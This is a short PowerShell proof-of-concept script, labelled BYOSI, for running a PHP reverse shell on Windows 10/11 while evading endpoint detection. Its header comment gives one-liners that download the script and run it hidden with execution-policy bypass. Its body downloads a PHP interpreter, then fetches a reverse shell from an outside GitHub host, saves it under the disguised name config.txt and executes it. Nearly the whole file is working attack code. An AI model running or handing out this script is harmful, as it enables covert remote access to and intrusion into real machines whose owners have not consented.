<# 
BYOSI POC - Changed the interpreter, the environment variables, arguments, and made a new php shell.
            Tested against a default installation of Windows 10 updated, and Windows 10/11 with EDR running.

Method 1
 bitsadmin /transfer myDownloadJob /download /priority high https://raw.githubusercontent.com/fuzzlove/byosi/refs/heads/main/byosi.ps1 %temp%\myscript.ps1 & powershell -exec bypass -nop -w hidden -file %temp%\myscript.ps1

Method 2
wget https://raw.githubusercontent.com/fuzzlove/byosi/refs/heads/main/byosi.ps1 -o byosipoc.ps1;./byosipoc.ps1

#>

# Download our php interpreter
wget https://windows.php.net/downloads/releases/php-8.0.30-nts-Win32-vs16-x86.zip -O $Env:temp\\php.zip

# Extract from c:\windows\temp\php.zip to c:\php (default path)
Expand-Archive -Path $Env:temp\\php.zip -DestinationPath C:\\php

# Download our reverse shell
wget https://raw.githubusercontent.com/fuzzlove/byosi/refs/heads/main/php.txt -O C:\\php\\config.txt

# Run php with required sockets extention for reverse shell
& "C:\\php\\php.exe" @('-d extension=sockets') @('C:\php\config.txt')
